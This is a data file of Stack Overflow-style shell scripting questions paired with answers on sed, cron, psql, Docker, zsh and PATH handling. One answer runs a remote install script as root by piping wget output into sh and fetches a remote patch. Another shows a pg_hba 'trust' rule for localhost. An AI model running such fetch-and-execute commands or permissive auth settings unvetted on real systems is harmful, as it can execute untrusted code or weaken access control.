    "How to expand shell variables in a text file?": "This question has been asked in another thread, and this is the best answer IMO:\nexport LOG_FILE_PATH=/expanded/path/of/the/log/file/../logfile.log\ncat Text_File.msh | envsubst > Text_File_expanded.msh\nif on Mac, install gettext first: brew install gettext\nsee: Forcing bash to expand variables in a string loaded from a file",
    "Iterating through a range of ints in ksh?": "Curly brackets?\nfor i in {1..7}\ndo\n   #stuff\ndone",
    "Pipe string to GNU Date for conversion - how to make it read from stdin?": "date -f tells it to do the same thing as -d except for every line in a file... you can set the filename to - to make it read from standard input.\necho \"yesterday\" | date +\"%d %m %Y\" -f -",
    "How do I iterate through lines in an external file with shell? [duplicate]": "One way would be:\nwhile read NAME\ndo\n    echo \"$NAME\"\ndone < names.txt\nEDIT: Note that the loop gets executed in a sub-shell, so any modified variables will be local, except if you declare them with declare outside the loop.\nDennis Williamson is right. Sorry, must have used piped constructs too often and got confused.",
    "how to remove all occurences of dot in a string in a shell script?": "$ foo=test.test.test\n$ echo \"${foo//./}\"\ntesttesttest",
    "Set Default Shell in Cygwin": "Try editing /etc/nsswitch.conf instead of /etc/passwd\nInstead of creating a passwd file, which Cygwin recommends against1, you could edit /etc/nsswitch.conf. Add or edit the following line:\ndb_shell: /usr/bin/fish\nThe down/up side of this method is that, if you have multiple users, this change affects all of them. The up/up side is that it's dead simple. The only catch is that you have to restart Cygwin.\nIf you do use mkpasswd after this change, it will use your new default shell for all users that are allowed to log on.\nReferences\n1 The mkpasswd documentation says this:\nDon't use this command to generate a local /etc/passwd file, unless you really need one. See the Cygwin User's Guide for more information.\nI can't really find any solid reasoning in the user's guide, other than a mention that you'll have to regenerate the /etc/passwd and /etc/group files if your users and groups change, which I suppose is a decent enough reason. I can say that the process is somewhat error prone for newbies.",
    "How can I highlight the warning and error lines in the make output?": "Have a look at colormake, found here\n$ apt-cache search colormake\ncolormake - simple wrapper around make to colorize output\nUsing the power of google, I also found this bash-function.\nmake()\n{\n  pathpat=\"(/[^/]*)+:[0-9]+\"\n  ccred=$(echo -e \"\\033[0;31m\")\n  ccyellow=$(echo -e \"\\033[0;33m\")\n  ccend=$(echo -e \"\\033[0m\")\n  /usr/bin/make \"$@\" 2>&1 | sed -E -e \"/[Ee]rror[: ]/ s%$pathpat%$ccred&$ccend%g\" -e \"/[Ww]arning[: ]/ s%$pathpat%$ccyellow&$ccend%g\"\n  return ${PIPESTATUS[0]}\n}",
    "how do i add database name with hyphen character using script in ubuntu": "In mysql queries table names may contain alphanumeric characters, underscore and dollar sign. In order to be able to use other ANSI characters you must place names in single backquotes.\n`table-db`\nBut in bash they have different meaning and used for command substitution. In bash there are also several types of strings -- in double quotes and in single quotes. The difference between them is that in double quotes variable expansion and command substitution are performed, while in single quotes they don't. So you can use backquotes with mysql semantics within single quotes as is\nmysql -e 'CREATE DATABASE `table-db`;'\nbut must escape them when using within double quotes, so that they wouldn't be interpreted by bash as command sustitution.\nmysql -e \"CREATE DATABASE \\`table-db\\`;\"\nAs you want to get the database name from variable you need to place it beyond single quote strings, like that:\nmysql -e \"CREATE DATABASE \\`$dbname\\`;\"\nor like that:\nmysql -e 'CREATE DATABASE `'$dbname'`;'",
    "How can I truncate a line of text longer than a given length?": "GnuTools head can use chars rather than lines:\nhead -c 15 <<<'This is an example sentence'\nAlthough consider that head -c only deals with bytes, so this is incompatible with multi-bytes characters like UTF-8 umlaut \u00fc.\nBash built-in string indexing works:\nstr='This is an example sentence'\necho \"${str:0:15}\"\nOutput:\nThis is an exam\nAnd finally something that works with ksh, dash, zsh\u2026:\nprintf '%.15s\\n' 'This is an example sentence'\nEven programmatically:\nn=15\nprintf '%.*s\\n' $n 'This is an example sentence'\nIf you are using Bash, you can directly assign the output of printf to a variable and save a sub-shell call with:\ntrim_length=15\nfull_string='This is an example sentence'\nprintf -v trimmed_string '%.*s' $trim_length \"$full_string\"",
    "Why I'm getting unexpected EOF for my cron job?": "You may need to escape the % with a \\. % is a special character to the crontab, which gets translated to a newline, so your code was probably becoming\n -p']T\n zw51'\nTry:\n -p']T\\%zw51'",
    "Android: How to Know if any application is already installed in android device using adb?": "",
    "use conditional in bash script to check string argument": "What about the shorter :\n#!/bin/bash\n\n[[ $1 == A ]] && echo \"A\" || echo \"not A\"\n?\nAnd a beginner version (identical logic) :\n#!/bin/bash\n\nif [[ $1 == A ]]; then\n    echo \"A\"\nelse\n    echo \"not A\"\nfi\nLike Scott said, you have a syntax error (missing space).\nexplanations\nI use boolean logic here. [[ $1 == A ]] is executed, and then if its true, echo \"A\" is executed, and if it's false, echo \"not A\" is executed, See http://mywiki.wooledge.org/BashGuide/TestsAndConditionals\n[[ is a bash keyword similar to (but more powerful than) the [ command. See http://mywiki.wooledge.org/BashFAQ/031 and http://mywiki.wooledge.org/BashGuide/TestsAndConditionals Unless you're writing for POSIX sh, I recommend [[.",
    "How to check directory exist or not in linux.? [duplicate]": "With bash/sh/ksh, you can do:\nif [ ! -d /directory/to/check ]; then\n    mkdir -p /directory/toc/check\nfi\nFor files, replace -d with -f, then you can do whatever operations you need on the non-existant file.",
    "Find file then cd to that directory in Linux": "You can use something like:\ncd -- \"$(dirname \"$(find / -type f -name ls | head -1)\")\"\nThis will locate the first ls regular file then change to that directory.\nIn terms of what each bit does:\nThe find will start at / and search down, listing out all regular files (-type f) called ls (-name ls). There are other things you can add to find to further restrict the files you get.\nThe | head -1 will filter out all but the first line.\n$() is a way to take the output of a command and put it on the command line for another command.\ndirname can take a full file specification and give you the path bit.\ncd just changes to that directory, the -- is used to prevent treating a directory name beginning with a hyphen from being treated as an option to cd.\nIf you execute each bit in sequence, you can see what happens:\npax[/home/pax]> find / -type f -name ls\n/usr/bin/ls\n\npax[/home/pax]> find / -type f -name ls | head -1\n/usr/bin/ls\n\npax[/home/pax]> dirname \"$(find / -type f -name ls | head -1)\"\n/usr/bin\n\npax[/home/pax]> cd -- \"$(dirname \"$(find / -type f -name ls | head -1)\")\"\n\npax[/usr/bin]> _",
    "how to correctly use fork, exec, wait": "Here's a simple, readable solution:\npid_t parent = getpid();\npid_t pid = fork();\n\nif (pid == -1)\n{\n    // error, failed to fork()\n} \nelse if (pid > 0)\n{\n    int status;\n    waitpid(pid, &status, 0);\n}\nelse \n{\n    // we are the child\n    execve(...);\n    _exit(EXIT_FAILURE);   // exec never returns\n}\nThe child can use the stored value parent if it needs to know the parent's PID (though I don't in this example). The parent simply waits for the child to finish. Effectively, the child runs \"synchronously\" inside the parent, and there is no parallelism. The parent can query status to see in what manner the child exited (successfully, unsuccessfully, or with a signal).",
    "How to check if dir exists over ssh and return results to host machine [duplicate]": "You are very close:\nChange if statement to\nif ssh username@ssh_server '[ -d /directory ]'\nI am assuming that you have setup key-based authentication.",
    "How to write Unix shell scripts with options?": "$ cat stack.sh \n#!/bin/sh\nif  [[ $1 = \"-o\" ]]; then\n    echo \"Option -o turned on\"\nelse\n    echo \"You did not use option -o\"\nfi\n\n$ bash stack.sh -o\nOption -o turned on\n\n$ bash stack.sh\nYou did not use option -o\nFYI:\n$1 = First positional parameter\n$2 = Second positional parameter\n.. = ..\n$n = n th positional parameter\nFor more neat/flexible options, read this other thread: Using getopts to process long and short command line options",
    "How to export multiple variables with same value in ksh?": "Ksh93 (or bash) doesn't have such expressions, so it's better to make it explicit. But you can bundle multiple variables (with their initial values) in a single export phrase:\nexport A=1 B=2 C=3\nTesting:\n$ (export A=1 B=2 C=3 && ksh -c 'echo A=$A B=$B C=$C D=$D')\nA=1 B=2 C=3 D=\nAwkward alternatives\nThere is no C-like shortcut, unless you want this ugly thing:\nA=${B:=${C:=1}}; echo $A $B $C\n1 1 1\n... which does not work with export, nor does it work when B or C are empty or non-existent.\nArithmetic notation\nKsh93 arithmetic notation does actually support C-style chained assignments, but for obvious reasons, this only works with numbers, and you'll then have to do the export separately:\n$ ((a=b=c=d=1234))\n$ echo $a $b $c $d\n1234 1234 1234 1234\n$ export a b d\n$ ksh -c 'echo a=$a b=$b c=$c d=$d'     # Single quotes prevent immediate substitution\na=1234 b=1234 c= d=d1234                # so new ksh instance has no value for $c\nNote how we do not export c, and its value in the child shell is indeed empty.",
    "How can I get a secure system-wide oh-my-zsh configuration?": "Unless I'm misunderstanding the marked answer from Caleb is just the normal per-user installation steps with adding a .zshrc file to the skel dir and changing the default new-user shell, but it doesn't actually work or really answer the question because each user still requires the oh-my-zsh dir/would still require each user to clone the oh-my-zsh dir into their own folder meaning it's not really installed system wide, it just automatically gives them a zshrc file and changes the default shell to zsh, but without oh-my-zsh in each user folder it will error out.\nFrom what I understand of the question it's asking how to install oh-my-zsh system-wide aka have it installed in ONE place and not require manually messing around on each new user/having a git clone of oh-my-zsh on each user dir. Assuming that's the case, here's what I did based off Arch Linux's AUR Package I normally use but was looking for the same on a centos server, however this can be done on any distro. Credit goes to MarcinWieczorek and the other maintainers, I just adapted the below so can do the same on non-arch distros.\nIf you already have oh-my-zsh installed on root just skip to Step 3. This isn't distro specific just uses the AUR Patch File for zshrc\nStep #1\nInstall zsh of course\nStep #2\nInstall oh-my-zsh as root as normal (shows wget method, see Calebs answer for alternative)\nsh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\"\nStep #3\nMove the install to /usr/share so is system-wide\n#Copy zsh files to /usr/share for all uer access \nmv /root/.oh-my-zsh /usr/share/oh-my-zsh\n# Move into the dir and copy the zshrc template to zshrc (which will be the default for users)\ncd /usr/share/oh-my-zsh/\ncp templates/zshrc.zsh-template zshrc\n# Nab the patch file from MarcinWieczorek's AUR Package and apply to the zshrc file\nwget https://aur.archlinux.org/cgit/aur.git/plain/0001-zshrc.patch\\?h\\=oh-my-zsh-git -O zshrc.patch && patch -p1 < zshrc.patch\nNow oh-my-zsh is installed globally and the user just needs that zshrc file. so NOW is where Caleb's answer comes in though just do the below as /etc/adduser.conf is only on debian whereas the below should be distro independent.\nStep #4\nSet it up to be the default on new users\n# Create hard link to the zshrc file so it creates an actual independent copy on new users\nsudo ln /usr/share/oh-my-zsh/zshrc /etc/skel/.zshrc\n# Set default shell to zsh\nsudo adduser -D -s /bin/zsh\nNow that's a true installation of oh-my-zsh with all new users automatically having it applied with the /usr/share/oh-my-zsh/zshrc settings and no other steps needed.\nMisc Notes\nFor any pre-existing users with oh-my-zsh:\ncp /usr/share/oh-my-zsh/zshrc ~/.zshrc\nYou can set new user OMZ defaults in /usr/share/oh-my-zsh/zshrc\nAuto Updates are disabled since new users do not have permissions to update the /usr/share/oh-my-zsh files\nTo update oh-my-zsh just cd to /usr/share/oh-my-zsh/ and run 'sudo git pull'\nThe oh-my-zsh cache will be handled per-user within each user dir under ~/.oh-my-zsh-cache/ (automatically created)",
    "Shell script to copy files from one location to another location and add the current date to every file name": "In bash, provided you files names have no spaces:\ncd /home/webapps/project1/folder1\nfor f in *.csv\ndo \n   cp -v \"$f\" /home/webapps/project1/folder2/\"${f%.csv}\"$(date +%m%d%y).csv\ndone",
    "How to output return code in shell?": "echo $? >> /path/to/return_code\n$? has the return code of the last statement in bash.",
    "How to grep '---' in Linux? grep: unrecognized option '---'": "This happens because grep interprets --- as an option instead of a text to look for. Instead, use --:\ngrep -- \"---\" your_file\nThis way, you tell grep that the rest is not a command line option.\nOther options:\nuse grep -e (see Kent's solution, as I added it when he had already posted it - didn't notice it until now):\nuse awk (see anubhava's solution) or sed:\nsed -n '/---/p' file\n-n prevents sed from printing the lines (its default action). Then /--- matches those lines containing --- and /p makes them be printed.",
    "Run batch file with psql command without password": "Keep reading, the best options come last. But let's clarify a couple of things first.\nOnly silence the password request\nIf your issue is only the password prompt, you can silence it. I quote the manual here:\n-w\n--no-password\nNever issue a password prompt. If the server requires password authentication and a password is not available by other means such as a .pgpass file, the connection attempt will fail. This option can be useful in batch jobs and scripts where no user is present to enter a password. (...)\nYou probably don't need a password\nNormally this is unnecessary. The default database superuser postgres usually corresponds to the system user of the same name. Running psql from this account doesn't require a password if the authentication method peer or ident are set in your pg_hba.conf file. You probably have a line like this:\nlocal    all    postgres    peer\nAnd usually also:\nlocal    all    all         peer\nThis means, every local user can log into a all database as database user of the same name without password.\nHowever, there is a common misconception here. Quoting again:\nThis method is only supported on local connections.\nBold emphasis mine.\nYou are connecting to localhost, which is not a \"local connection\", even though it has the word \"local\" in it. It's a TCP/IP connection to 127.0.0.1. Wikipedia on localhost:\nOn modern computer systems, localhost as a hostname translates to an IPv4 address in the 127.0.0.0/8 (loopback) net block, usually 127.0.0.1, or ::1 in IPv6.\nSimple solution for local connections\nOmit the parameter -h from the psql invocation. Quoting the manual on psql once more:\nIf you omit the host name, psql will connect via a Unix-domain socket to a server on the local host, or via TCP/IP to localhost on machines that don't have Unix-domain sockets.\nWindows\n... doesn't have Unix-domain sockets, pg_hba.conf lines starting with local are not applicable on Windows. On Windows you connect via localhost by default, which brings us back to the start.\nIf your security requirements are lax, you could just trust all connections via localhost:\nhost    all    all    127.0.0.1/32     trust\nI would only do that for debugging with remote connections off. For some more security you can use SSPI authentication on Windows. Add this line to pg_hba.conf for \"local\" connections:\nhost    all    all    127.0.0.1/32     sspi\nIf you actually need a password\nYou could set an environment variable, but this is discouraged, especially for Windows. The manual:\nPGPASSWORD behaves the same as the password connection parameter. Use of this environment variable is not recommended for security reasons, as some operating systems allow non-root users to see process environment variables via ps; instead consider using the ~/.pgpass file (see Section 32.15).\nThe manual on psql:\nA conninfo string is an alternative to specify connection parameters:\n $ psql \"user=myuser password=secret_pw host=localhost port=5432 sslmode=require\"\nOr a URI, which is used instead of a database name:\n $ psql postgresql://myuser:secret_pw@localhost:5432/mydb?sslmode=require\nPassword File\nBut it's usually preferable to set up a .pgpass file rather than putting passwords into script files.\nRead the short chapter in the manual carefully. In particular, note that here ...\nA host name of localhost matches both TCP (host name localhost) and Unix domain socket (pghost empty or the default socket directory) connections coming from the local machine.\nExact path depends on the system. This file can store passwords for multiple combinations of role and port (DB cluster):\nlocalhost:5432:*:myadmin:myadminPasswd\nlocalhost:5434:*:myadmin:myadminPasswd\nlocalhost:5437:*:myadmin:myadminPasswd\n...\nOn Windows machines look for the file in:\n%APPDATA%\\postgresql\\pgpass.conf\n%APPDATA% typically resolves to: C:\\Documents and Settings\\My_Windows_User_Name\\Application Data\\.",
    "docker alpine /bin/sh script.sh not found": "Make sure the shebang on the script points to an interpreter that actually exists. Thus, if the script being invoked uses:\n#!/bin/bash\n...then /bin/bash needs to actually be installed. (Alternately, you might consider trying to port the script to work with POSIX sh, and modifying its shebang to /bin/sh).",
    "Colorize tail output": "yes, there is way to do this. That is, as long as your terminal supports ANSI escape sequences. This is most terminals that exist.\nI think I don't need explain how to grep, sed etc. point is the color right?\nsee below, this will make\nWARN yellow\nERROR red\nfoo   green\nhere is example:\nkent$ echo \"WARN\nERROR\nfoo\"|sed 's#WARN#\\x1b[33m&#; s#ERROR#\\x1b[31m&#; s#foo#\\x1b[32m&#'\nNote: \\x1b is hexadecimal for the ESC character (^VEsc).\nto see the result:",
    "Declaring global variable inside a function": "declare inside a function doesn't work as expected. I needed read-only global variables declared in a function. I tried this inside a function but it didn't work:\ndeclare -r MY_VAR=1\nBut this didn't work. Using the readonly command did:\nfunc() {\n    readonly MY_VAR=1\n}\nfunc\necho $MY_VAR\nMY_VAR=2\nThis will print 1 and give the error \"MY_VAR: readonly variable\" for the second assignment.",
    "How to use pastebin from shell script?": "As pastebin.com closed their public api, I was looking for alternatives.\nSprunge is great. Usage:\n<command> | curl -F 'sprunge=<-' http://sprunge.us\nor, as I use it:\nalias paste=\"curl -F 'sprunge=<-' http://sprunge.us\"\n<command> | paste",
    "Sending messages with Telegram - APIs or CLI?": "Telegram recently released their new Bot API which makes sending/receiving messages trivial. I suggest you also take a look at that and see if it fits your needs, it beats wrapping the client library or integrating with their MTProto API.\nimport urllib\nimport urllib2\n\n# Generate a bot ID here: https://core.telegram.org/bots#botfather\nbot_id = \"{YOUR_BOT_ID}\"\n\n# Request latest messages\nresult = urllib2.urlopen(\"https://api.telegram.org/bot\" + bot_id + \"/getUpdates\").read()\nprint result\n\n# Send a message to a chat room (chat room ID retrieved from getUpdates)\nresult = urllib2.urlopen(\"https://api.telegram.org/bot\" + bot_id + \"/sendMessage\", urllib.urlencode({ \"chat_id\": 0, \"text\": 'my message' })).read()\nprint result\nUnfortunately I haven't seen any Python libraries you can interact directly with, but here is a NodeJS equivalent I worked on for reference.",
    "linux copy symbolic link [closed]": "Use the -d option:\ncp -d files /var/copylinktohere/\nFrom man cp:\n   -d     same as --no-dereference --preserve=link\n\n   --no-dereference\n          never follow symbolic links",
    "Opening default text editor in Bash?": "The user's chosen editor should be in $EDITOR, but you must still choose a sane default.\n\"${EDITOR:-vi}\" file.txt",
    "jq - Cannot index string with string": "According to the jq manual, .[] gets the values of the object when applied to object.\nSo you get two objects, one for value of \"properties\" and another for value of \"uri\":\n{\n  \"CloudSanityPassed\": [\n    \"true\"\n  ],\n  \"GITCOMMIT\": [\n    \"test1\"\n  ],\n  \"buildNumber\": [\n    \"54\"\n  ],\n  \"jobName\": [\n    \"InveergDB-UI\"\n  ]\n}\n\"http://ergctory:8081/aergergory/api/storage/test-reergerglease-reergpo/cergom/cloergud/waf/ergregBUI/1ergerggregSHOT/ergregerg-34.zip\"\njq tries to apply .\"CloudSanityPassed\" operator to each object.\nSince former object is dictionary (aka hash), you can apply .\"CloudSanityPassed\" and get the value [\"true\"], however, latter is a simple string against which you cannot apply .\"CloudSanityPassed\", so jq outputs an error at that point.\nMaybe the command you want is just .properties.CloudSanityPassed.",
    "How portable is mktemp(1)?": "POSIX does not seem to specify mktemp(1).\nIt looks like most modern systems have it, but the available functionality and the semantics of the options vary between implementations (so particular invocations may not be portable):\nmktemp(1) from OpenBSD \u2014 mktemp(1) originated in OpenBSD 2.1\nmktemp(1) from FreeBSD\nmktemp(1) from Mac OS X \u2014 almost always the same as from FreeBSD\nmktemp(1) from Todd C. Miller of sudo fame\nmktemp(1) from Solaris\nmktemp(1) from GNU coreutils\nmktemp(1) from HP/UX \u2014 this one seems particularly divergent from most of the others listed here\nSo if you want a portable solution you may need to stick to functionality and options that mean the same thing on all of your platforms of interest.",
    "How to insert a line using sed before a pattern and after a line number?": "You can either write a sed script file and use:\nsed -f sed.script file1 ...\nOr you can use (multiple) -e 'command' options:\nsed -e '/SysAdmin/i\\\nLinux Scripting' -e '1,$s/A/a/' file1 ...\nIf you want to append something after a line, then:\nsed -e '234a\\\nText to insert after line 234' file1 ...",
    "How do I manipulate $PATH elements in shell scripts?": "Addressing the proposed solution from dmckee:\nWhile some versions of Bash may allow hyphens in function names, others (MacOS X) do not.\nI don't see a need to use return immediately before the end of the function.\nI don't see the need for all the semi-colons.\nI don't see why you have path-element-by-pattern export a value. Think of export as equivalent to setting (or even creating) a global variable - something to be avoided whenever possible.\nI'm not sure what you expect 'replace-path PATH $PATH /usr' to do, but it does not do what I would expect.\nConsider a PATH value that starts off containing:\n.\n/Users/jleffler/bin\n/usr/local/postgresql/bin\n/usr/local/mysql/bin\n/Users/jleffler/perl/v5.10.0/bin\n/usr/local/bin\n/usr/bin\n/bin\n/sw/bin\n/usr/sbin\n/sbin\nThe result I got (from 'replace-path PATH $PATH /usr') is:\n.\n/Users/jleffler/bin\n/local/postgresql/bin\n/local/mysql/bin\n/Users/jleffler/perl/v5.10.0/bin\n/local/bin\n/bin\n/bin\n/sw/bin\n/sbin\n/sbin\nI would have expected to get my original path back since /usr does not appear as a (complete) path element, only as part of a path element.\nThis can be fixed in replace-path by modifying one of the sed commands:\nexport $path=$(echo -n $list | tr \":\" \"\\n\" | sed \"s:^$removestr\\$:$replacestr:\" |\n               tr \"\\n\" \":\" | sed \"s|::|:|g\")\nI used ':' instead of '|' to separate parts of the substitute since '|' could (in theory) appear in a path component, whereas by definition of PATH, a colon cannot. I observe that the second sed could eliminate the current directory from the middle of a PATH. That is, a legitimate (though perverse) value of PATH could be:\nPATH=/bin::/usr/local/bin\nAfter processing, the current directory would no longer be on the PATH.\nA similar change to anchor the match is appropriate in path-element-by-pattern:\nexport $target=$(echo -n $list | tr \":\" \"\\n\" | grep -m 1 \"^$pat\\$\")\nI note in passing that grep -m 1 is not standard (it is a GNU extension, also available on MacOS X). And, indeed, the-n option for echo is also non-standard; you would be better off simply deleting the trailing colon that is added by virtue of converting the newline from echo into a colon. Since path-element-by-pattern is used just once, has undesirable side-effects (it clobbers any pre-existing exported variable called $removestr), it can be replaced sensibly by its body. This, along with more liberal use of quotes to avoid problems with spaces or unwanted file name expansion, leads to:\n# path_tools.bash\n#\n# A set of tools for manipulating \":\" separated lists like the\n# canonical $PATH variable.\n#\n# /bin/sh compatibility can probably be regained by replacing $( )\n# style command expansion with ` ` style\n###############################################################################\n# Usage:\n#\n# To remove a path:\n#    replace_path         PATH $PATH /exact/path/to/remove\n#    replace_path_pattern PATH $PATH <grep pattern for target path>\n#\n# To replace a path:\n#    replace_path         PATH $PATH /exact/path/to/remove /replacement/path\n#    replace_path_pattern PATH $PATH <target pattern> /replacement/path\n#\n###############################################################################\n\n# Remove or replace an element of $1\n#\n#   $1 name of the shell variable to set (e.g. PATH)\n#   $2 a \":\" delimited list to work from (e.g. $PATH)\n#   $3 the precise string to be removed/replaced\n#   $4 the replacement string (use \"\" for removal)\nfunction replace_path () {\n    path=$1\n    list=$2\n    remove=$3\n    replace=$4        # Allowed to be empty or unset\n\n    export $path=$(echo \"$list\" | tr \":\" \"\\n\" | sed \"s:^$remove\\$:$replace:\" |\n                   tr \"\\n\" \":\" | sed 's|:$||')\n}\n\n# Remove or replace an element of $1\n#\n#   $1 name of the shell variable to set (e.g. PATH)\n#   $2 a \":\" delimited list to work from (e.g. $PATH)\n#   $3 a grep pattern identifying the element to be removed/replaced\n#   $4 the replacement string (use \"\" for removal)\nfunction replace_path_pattern () {\n    path=$1\n    list=$2\n    removepat=$3\n    replacestr=$4        # Allowed to be empty or unset\n\n    removestr=$(echo \"$list\" | tr \":\" \"\\n\" | grep -m 1 \"^$removepat\\$\")\n    replace_path \"$path\" \"$list\" \"$removestr\" \"$replacestr\"\n}\nI have a Perl script called echopath which I find useful when debugging problems with PATH-like variables:\n#!/usr/bin/perl -w\n#\n#   \"@(#)$Id: echopath.pl,v 1.7 1998/09/15 03:16:36 jleffler Exp $\"\n#\n#   Print the components of a PATH variable one per line.\n#   If there are no colons in the arguments, assume that they are\n#   the names of environment variables.\n\n@ARGV = $ENV{PATH} unless @ARGV;\n\nforeach $arg (@ARGV)\n{\n    $var = $arg;\n    $var = $ENV{$arg} if $arg =~ /^[A-Za-z_][A-Za-z_0-9]*$/;\n    $var = $arg unless $var;\n    @lst = split /:/, $var;\n    foreach $val (@lst)\n    {\n            print \"$val\\n\";\n    }\n}\nWhen I run the modified solution on the test code below:\necho\nxpath=$PATH\nreplace_path xpath $xpath /usr\nechopath $xpath\n\necho\nxpath=$PATH\nreplace_path_pattern xpath $xpath /usr/bin /work/bin\nechopath xpath\n\necho\nxpath=$PATH\nreplace_path_pattern xpath $xpath \"/usr/.*/bin\" /work/bin\nechopath xpath\nThe output is:\n.\n/Users/jleffler/bin\n/usr/local/postgresql/bin\n/usr/local/mysql/bin\n/Users/jleffler/perl/v5.10.0/bin\n/usr/local/bin\n/usr/bin\n/bin\n/sw/bin\n/usr/sbin\n/sbin\n\n.\n/Users/jleffler/bin\n/usr/local/postgresql/bin\n/usr/local/mysql/bin\n/Users/jleffler/perl/v5.10.0/bin\n/usr/local/bin\n/work/bin\n/bin\n/sw/bin\n/usr/sbin\n/sbin\n\n.\n/Users/jleffler/bin\n/work/bin\n/usr/local/mysql/bin\n/Users/jleffler/perl/v5.10.0/bin\n/usr/local/bin\n/usr/bin\n/bin\n/sw/bin\n/usr/sbin\n/sbin\nThis looks correct to me - at least, for my definition of what the problem is.\nI note that echopath LD_LIBRARY_PATH evaluates $LD_LIBRARY_PATH. It would be nice if your functions were able to do that, so the user could type:\nreplace_path PATH /usr/bin /work/bin\nThat can be done by using:\nlist=$(eval echo '$'$path)\nThis leads to this revision of the code:\n# path_tools.bash\n#\n# A set of tools for manipulating \":\" separated lists like the\n# canonical $PATH variable.\n#\n# /bin/sh compatibility can probably be regained by replacing $( )\n# style command expansion with ` ` style\n###############################################################################\n# Usage:\n#\n# To remove a path:\n#    replace_path         PATH /exact/path/to/remove\n#    replace_path_pattern PATH <grep pattern for target path>\n#\n# To replace a path:\n#    replace_path         PATH /exact/path/to/remove /replacement/path\n#    replace_path_pattern PATH <target pattern> /replacement/path\n#\n###############################################################################\n\n# Remove or replace an element of $1\n#\n#   $1 name of the shell variable to set (e.g. PATH)\n#   $2 the precise string to be removed/replaced\n#   $3 the replacement string (use \"\" for removal)\nfunction replace_path () {\n    path=$1\n    list=$(eval echo '$'$path)\n    remove=$2\n    replace=$3            # Allowed to be empty or unset\n\n    export $path=$(echo \"$list\" | tr \":\" \"\\n\" | sed \"s:^$remove\\$:$replace:\" |\n                   tr \"\\n\" \":\" | sed 's|:$||')\n}\n\n# Remove or replace an element of $1\n#\n#   $1 name of the shell variable to set (e.g. PATH)\n#   $2 a grep pattern identifying the element to be removed/replaced\n#   $3 the replacement string (use \"\" for removal)\nfunction replace_path_pattern () {\n    path=$1\n    list=$(eval echo '$'$path)\n    removepat=$2\n    replacestr=$3            # Allowed to be empty or unset\n\n    removestr=$(echo \"$list\" | tr \":\" \"\\n\" | grep -m 1 \"^$removepat\\$\")\n    replace_path \"$path\" \"$removestr\" \"$replacestr\"\n}\nThe following revised test now works too:\necho\nxpath=$PATH\nreplace_path xpath /usr\nechopath xpath\n\necho\nxpath=$PATH\nreplace_path_pattern xpath /usr/bin /work/bin\nechopath xpath\n\necho\nxpath=$PATH\nreplace_path_pattern xpath \"/usr/.*/bin\" /work/bin\nechopath xpath\nIt produces the same output as before.",
    "How does \"(head; tail) < file\" work?": "OS X\nFor OS X, you can look at the source code for head and the source code for tail to figure out some of what's going on. In the case of tail, you'll want to look at forward.c.\nSo, it turns out that head doesn't do anything special. It just reads its input using the stdio library, so it reads a buffer at a time and might read too much. This means cat file | (head; tail) won't work for small files where head's buffering makes it read some (or all) of the last 10 lines.\nOn the other hand, tail checks the type of its input file. If it's a regular file, tail seeks to the end and reads backwards until it finds enough lines to emit. This is why (head; tail) < file works on any regular file, regardless of size.\nLinux\nYou could look at the source for head and tail on Linux too, but it's easier to just use strace, like this:\n(strace -o /tmp/head.trace head; strace -o /tmp/tail.trace tail) < file\nTake a look at /tmp/head.trace. You'll see that the head command tries to fill a buffer (of 8192 bytes in my test) by reading from standard input (file descriptor 0). Depending on the size of file, it may or may not fill the buffer. Anyway, let's assume that it reads 10 lines in that first read. Then, it uses lseek to back up the file descriptor to the end of the 10th line, essentially \u201cunreading\u201d any extra bytes it read. This works because the file descriptor is open on a normal, seekable file. So (head; tail) < file will work for any seekable file, but it won't make cat file | (head; tail) work.\nOn the other hand, tail does not (in my testing) seek to the end and read backwards, like it does on OS X. At least, it doesn't read all the way back to the beginning of the file.\nHere's my test. Create a small, 12-line input file:\nyes | head -12 | cat -n > /tmp/file\nThen, try (head; tail) < /tmp/file on Linux. I get this with GNU coreutils 5.97:\n     1  y\n     2  y\n     3  y\n     4  y\n     5  y\n     6  y\n     7  y\n     8  y\n     9  y\n    10  y\n    11  y\n    12  y\nBut on OS X, I get this:\n     1  y\n     2  y\n     3  y\n     4  y\n     5  y\n     6  y\n     7  y\n     8  y\n     9  y\n    10  y\n     3  y\n     4  y\n     5  y\n     6  y\n     7  y\n     8  y\n     9  y\n    10  y\n    11  y\n    12  y",
    "Dockerfile: how to set env variable from file contents": "Environment Variables\nIf you want to set a number of environment variables into your docker image (to be used within the containers) you can simply use env_file configuration option in your docker-compose.yml file. With that option, all the entries in the .env file will be set as the environment variables in image and hence into containers.\nMore Info about env_file\nBuild ARGS\nIf your requirement is to use some variables only within your Dockerfile then you specify them as below\nARG FOO\nARG FOO1\nARG FOO2\netc...\nAnd you have to specify these arguments under the build key in your docker-compose.yml\nbuild:\n  context: .\n  args:\n    FOO: BAR\n    FOO1: BAR1\n    FOO2: BAR2\nMore info about args\nAccessing .env values within the docker-compose.yml file\nIf you are looking into passing some values into your docker-compose file from the .env then you can simply put your .env file same location as the docker-compose.yml file and you can set the configuration values as below;\nports:\n  - \"${HOST_PORT}:80\"\nSo, as an example you can set the host port for the service by setting it in your .env file\nPlease check this",
    "\"getpwnam() failed\" in /bin/sh only when called from cron": "It surprises me that nobody has the correct answer to this. Today i faced exactly the same problem and google didn't help.\nAfter 2 hours i found that when placing a file in /etc/cron.d the schedule line has to contain an extra option.....\nI allways use this for my crontab -e\n# Minute   Hour Day of Month     Month          Day of Week     Command    \n# (0-59)  (0-23)   (1-31)  (1-12 or Jan-Dec)  (0-6 or Sun-Sat)  /my/fancy/script.sh            \nSo it contains 6 items.\nWhen placing this in a file inside /etc/cron.d the cron needs an extra option, being the user to run your fancy/script.\n# Minute   Hour Day of Month     Month          Day of Week     Who   Command    \n# (0-59)  (0-23)   (1-31)  (1-12 or Jan-Dec)  (0-6 or Sun-Sat)  root  /my/fancy/script.sh            \nThis is documented in man crontab(5). For example https://linux.die.net/man/5/crontab . It says:\nJobs in /etc/cron.d/\nThe jobs in cron.d are system jobs, which are used usually for more than one user. That's the reason why is name of the user needed. MAILTO on the first line is optional.",
    "How do I tell Zsh to write the current shell's history to my history file?": "To write the shell history to the history file, do\nfc -W\nfc has some useful flags, see them all in man zshbuiltins.\nYou can also fully automate reading and writing the history file after each command (thus sharing your history file automatically with each running zsh) by saying setopt -o sharehistory. Read more history-related options in man zshoptions.",
